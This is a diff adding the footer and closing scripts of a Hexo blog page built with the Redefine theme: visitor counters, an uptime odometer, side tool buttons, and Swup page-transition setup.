+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
